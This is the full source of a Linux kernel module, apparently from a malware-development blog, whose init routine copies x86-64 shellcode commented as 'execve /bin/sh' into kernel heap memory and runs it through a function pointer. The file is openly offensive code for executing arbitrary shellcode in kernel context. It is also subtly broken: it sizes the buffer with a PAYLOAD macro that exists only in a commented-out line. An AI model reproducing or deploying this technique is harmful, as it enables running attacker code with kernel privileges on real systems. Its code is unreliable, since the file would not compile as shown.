#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/syscalls.h>
#include <linux/uaccess.h>
#include <linux/slab.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("cocomelonc");
MODULE_DESCRIPTION("Local Shellcode Execution Kernel Module");

// #define PAYLOAD "\x48\x31\xf6\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"  // execve /bin/sh

static int __init shellcode_init(void) {
  unsigned char *code;
  char payload[] = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"; // execve /bin/sh
  void (*func)();

  // Allocate memory for the payload
  code = kmalloc(sizeof(PAYLOAD), GFP_KERNEL);
  if (!code) {
    printk(KERN_ERR "Error allocating memory for shellcode\n");
    return -ENOMEM;
  }

  // copy shellcode into allocated memory
  memcpy(code, payload, sizeof(payload));

  // cast code to a function pointer and execute it
  func = (void (*)())code;
  func();  // execute shellcode (this runs /bin/sh)

  printk(KERN_INFO "shellcode executed successfully\n");

  return 0;
}

static void __exit shellcode_exit(void) {
  printk(KERN_INFO "shellcode module unloaded\n");
}

module_init(shellcode_init);
module_exit(shellcode_exit);
